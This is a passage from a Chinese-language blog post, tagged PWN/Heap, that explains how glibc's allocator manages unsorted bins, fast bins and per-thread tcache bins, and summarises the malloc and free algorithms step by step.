<p>因此堆管理器引入了<em>unsorted bin</em>，当一个块释放时，堆管理器没有立即将新释放的块放入相应的bin中，而是与相邻的块合并，然后将其转储到常规的<em>unsorted</em>的链表中。在<em>malloc</em>期间，将检查<em>unsorted bins</em>上的每个项目，以查看其是否“适合“请求。如果大小匹配，<em>malloc</em>可以立即使用它。如果没有匹配的块，则malloc之后会将块放入其相应的<em>small bins</em>或<em>large bins</em>中。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/7.png" class></strong></p>
<h3 id="FAST-BINS"><a href="#FAST-BINS" class="headerlink" title="FAST BINS"></a><strong>FAST BINS</strong></h3><p><em>fast bins</em>是在之前看到的三个基本bin基础上的进一步优化。这些bins实际上将最近释放的小块保留在“fast-turnaround queue”中，并且在块被释放之后不将其与相邻的块合并，使得这些块始终保持活跃状态，以便在释放后不久若有匹配该块大小的malloc请求，可以立即重新利用该块。</p>
<p>像<em>small bins</em>一样，每个<em>fast bins</em>仅负责单个固定大小的块。有10个这样的<em>fast bins</em>，覆盖大小为16、24、32、40、48、56、64、72、80和88字节的块以及块元数据。</p>
<p>与<em>small bins</em>不同，<em>fast bins</em>的块永远不会与相邻的块合并。实际上，这是堆管理器不会在下一个块的开头设置“ P”位的方式。换句话说，在概念上可以认为，堆管理器不会“真正”释放<em>fast bins</em>中的块。</p>
<p>和<em>small bins</em>相同的部分在于，<em>fast bins</em>也仅覆盖固定的大小的块，并且会自动排序分类，因此插入和删除的速度也非常快。而且，由于<em>fast-binned</em>的块永远不会合并，因此它们只需要被<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1678">存储在单链表</a>，而不需要存储在双向链表中，因为其不存在合并块时从列表中进行删除的操作。</p>
<p>当然，<em>fast bin</em>的缺点是，<em>fast bin</em>块不会“真正”释放或合并，最终会导致进程的内存空间随着时间的流逝而碎片化和膨胀。为了解决这个问题，堆管理器会定期“<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l4448">合并</a>”堆。通过“实际释放”它（即将其与相邻的空闲块合并），并将生成的空闲块放置到<em>unsorted bins</em>上，以供malloc之后使用，从而“刷新”<em>fast bins</em>中的每个条目。</p>
<p>每当<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1592">释放任何大于64KB的块</a>（其中64KB为近似值 ），或用户发出大于<em>fast bin</em>可以处理的<em>malloc</em>请求（即对于32位中<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l3696">512字节</a>以上的块或64位中1024字节以上的块）时，或者当程序调用<a href="http://man7.org/linux/man-pages/man3/mallopt.3.html">malloc_trim</a>或<a href="http://man7.org/linux/man-pages/man3/mallopt.3.html">mallopt</a>时，都会发生“合并”阶段。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/8.png" class></strong></p>
<h3 id="TCACHE-PER-THREAD-CACHE-BINS"><a href="#TCACHE-PER-THREAD-CACHE-BINS" class="headerlink" title="TCACHE (PER-THREAD CACHE) BINS"></a><strong>TCACHE (PER-THREAD CACHE) BINS</strong></h3><p>堆管理器用来加快分配速度的最终优化是每个线程进行缓存或“ <em>tcache”</em>分配器。首先让我们看一下tcache试图解决的问题。</p>
<p>假如一个计算机系统上的每个进程都同时运行一个或多个线程。多线程允许一个进程执行多个并发操作。例如，一个大容量的Web服务器可能同时具有多个传入请求，并且该Web服务器可能让每个传入请求都在自己的线程上进行服务，而不是让每个请求都排成一队等待服务。</p>
<p>给定进程中的每个线程共享相同的地址空间，也就是说，每个线程可以在内存中看到相同的代码和数据。每个线程都有自己的寄存器和堆栈来存储临时局部变量，但是诸如全局变量和堆之类的资源在所有线程之间共享。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/17/Heap/Heap-II/9.png" class></strong></p>
<p>协调访问诸如堆之类的全局资源是一个复杂的话题，它出错可能导致一个称为“<em>race condition”的问题</em>，这会导致难以调试的崩溃，通常也可被黑客利用。</p>
<p>假设在一个线程上提供服务的Web请求尝试更新数据库某一行，而另一个并发Web请求尝试从同一行读取。通常，我们将要确保第二个线程永远不会看到中间写入的值，但因为它正被另一个线程覆盖使用，从而第二个线程可能看到部分或损坏形式的行数据。数据库通过使读写操作看起来像<strong>原子操作</strong>来解决此问题：如果两个线程试图同时访问同一行，则必须先完成一个操作，然后才能开始下一个操作。解决这些竞争条件的一种非常常见的方法是通过使用锁，使其他同时访问全局资源的请求强制进入顺序队列。</p>
<p>通常，锁是通过一个线程在其使用之前“标记”它拥有全局资源的所有权，然后执行其操作，然后标记该资源不再使用来进行锁定的。如果出现另一个线程并希望使用该资源并看到其他线程正在使用该资源，则该线程将等待，直到另一个线程完成。这样可以确保全局资源一次仅由一个线程使用。但这带来了成本：正在等待资源的线程停滞并浪费时间。这称为“<em>lock contention</em>”（锁争用）。</p>
<p>对于许多全局变量，这个开销还可以接受。但是对于所有线程都在不断使用的堆，此开销会很快导致整个程序的速度变慢。</p>
<p>堆管理器主要通过为每个线程创建自己的<em>arena</em>解决这个问题，直到达到arena分配数目的阈值。此外，<em>tcache</em> 中<em>per-thread cache</em>的目的是减少锁本身的成本，因为锁指令开销很大，并且最终会占用”fast-path“中很大一部分执行时间。此功能已<a href="https://www.phoronix.com/scan.php?page=news_item&px=glibc-malloc-thread-cache">添加到glibc 2.26中的malloc内存分配功能中</a>，并且默认情况下启用。</p>
<p><em>Per-thread caching</em>通过准备好小块的<em>per-thread bins</em>来加快分配速度。这样，当线程请求一个块时，如果该线程在其tcache上有一个块可用，则它可以为分配提供服务，而不必等待堆锁。</p>
<p>默认情况下，每个线程都有64个单链接的<em>tcache bins</em>。每个bin最多包含<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l323">7个相同大小的块</a>，<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l315">在64位系统上为</a><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l315">24到1032字节，在32位系统上为12到516字节</a>。</p>
<h3 id="HOW-DO-CHUNKS-END-UP-IN-TCACHE-BINS"><a href="#HOW-DO-CHUNKS-END-UP-IN-TCACHE-BINS" class="headerlink" title="HOW DO CHUNKS END UP IN TCACHE BINS?"></a><strong>HOW DO CHUNKS END UP IN TCACHE BINS?</strong></h3><p>一个块被释放后，堆管理器将查看该块是否存在与该块大小相对应的<em>tcache</em>容器。与<em>fast bin</em>一样，<em>tcache bin</em> 上的块被视为“正在使用”，并且不会与相邻释放的块合并。</p>
<p>如果匹配该块大小的<em>tcache</em>已满（或者该块对于<em>tcache</em> bin而言太大），则堆管理器将恢复到我们以前的”slow-path“策略，即获取堆锁，然后像以前一样处理该块。</p>
<p>相应的<em>tcache</em>分配策略也非常简单。如果在匹配的<em>tcache</em> bin上有块可用，则给定一个块请求，堆将返回该块，而不会获得堆锁。如果块对于<em>tcache</em>来说太大，继续采用”slow-path“策略。</p>
<p>在我们尝试进行分配的情况下，有一个对应的<em>tcache bin</em>，但如果这个bin已满，我们进行了稍微修改的分配策略。我们不只是获取堆锁并查找单个块，还获取了堆锁，并<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3585">趁机将尽可能多的这种大小的块提升到<em>tcache，</em></a>（<strong>时间局部性和空间局部性</strong>）同时我们仍然保持堆锁，直到<em>tcache</em> bin限制为七个，<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3778">并且将最后匹配的块</a>返回给用户。</p>
<h3 id="PUTTING-IT-ALL-TOGETHER"><a href="#PUTTING-IT-ALL-TOGETHER" class="headerlink" title="PUTTING IT ALL TOGETHER"></a><strong>PUTTING IT ALL TOGETHER</strong></h3><p>下面让我们整体回顾一下，<em>glibc</em>中整个<em>malloc、free</em>的实现的算法。</p>
<p>首先，每个分配的内存块是对齐的，并包含元数据以及用户区域。当程序员从堆中请求内存时，堆管理器首先计算出分配请求对应的块大小，然后按以下顺序搜索内存（这里直接考虑多线程）：</p>
<ol>
<li><p>如果请求的块大小与<em>tcache bin</em>相匹配，并且<em>tcache bin</em>中有可用的块，则立即分配返回。</p>
</li>
<li><p>如果请求的块很大，则通过mmap分配堆外资源</p>
</li>
<li><p>否则，我们将获得<em>arena heap lock</em>，并且按照以下策略顺序执行：</p>
<p>​    <strong>A、尝试<em>fast bin / small bin</em>回收策略</strong></p>
<ul>
<li>如果存在相应的<em>fast bin</em>，尝试找到一个块匹配（同时用<em>fast bins</em>中的条目（如果存在匹配）预填充<em>tcache</em>）</li>
<li>否则，如果存在对应的<em>small bin</em>，尝试找到一个块匹配（同时预填充<em>tcache</em>）</li>
</ul>
</li>
</ol>
<p>   ​    <strong>B、解决所有延期释放块</strong></p>
<ul>
<li><p>否则，<em>fast bin</em>中的条目将被真正释放，并且将其合并到<em>unsorted bin</em>中。</p>
</li>
<li><p>遍历<em>unsorted bin</em>中的所有条目。如果匹配，则停止。否则，在操作时将unsorted中的条目放在其相应的<em>small/large bin</em>中（同时尽可能提升<em>small bin</em>中的条目到<em>tcache bin</em>）</p>
</li>
</ul>
<p>   ​    <strong>C、默认回到基本回收策略</strong></p>
<ul>
<li>如果块大小与一个<em>large bin</em>相匹配，则立即搜索相应的<em>large bin</em>           </li>
</ul>
<p>   ​    <strong>D、从头创建一个新的块</strong></p>
<ul>
<li><p>否则，将没有可用的块，所以尝试从堆顶部获取一个块</p>
</li>
<li><p>如果堆的顶部空间不足，尝试使用<em>sbrk</em>对其进行扩展</p>
</li>
<li><p>如果遇到了地址空间的其他问题，导致堆不可以扩展，则使用<em>mmap</em>创建一个不连续的扩展并从那里进行分配。</p>
</li>
</ul>
<p>   ​    <strong>E、如果所有方法均失败，则返回NULL 。</strong></p>
<p>以及相应的<em>free</em>策略：</p>
<ol>
<li>如果指针为NULL，则C标准将该行为定义为“不执行任何操作”。</li>
<li>否则，通过减去块元数据的大小，将指针指回。</li>
<li>对块执行一些完整性检查，如果完整性检查失败，则中止。</li>
<li>如果该块适合放入<em>tcache bin</em>，则将其存储在其中。</li>
<li>如果该块设置了<em>M</em>位，则通过<em>munmap</em>将其返回给操作系统。</li>
<li>否则，我们将获得<em>arena</em>堆锁，然后：<ul>
<li>如果该块适合一个fastbin，将其放在相应的fastbin上，结束。</li>
<li>如果块大于64KB，立即合并fastbin，然后将合并的块放入<em>unsorted bin</em>中。</li>
<li>将数据块与相邻的释放的数据块在<em>small bin、large bin、unsorted bin</em>中前后合并。</li>
<li>如果生成的块位于堆的顶部，则将其合并到堆的顶部，而不是将其存储在bin中。</li>
<li>否则将其存储在<em>unsorted bin</em>中。（<em>Malloc</em>稍后会做工作，将<em>unsorted bin</em>中的条目放入<em>small bin</em>或者<em>large bin</em>中。）</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Heap</category>
        <category>Heap_Basic</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
</search>
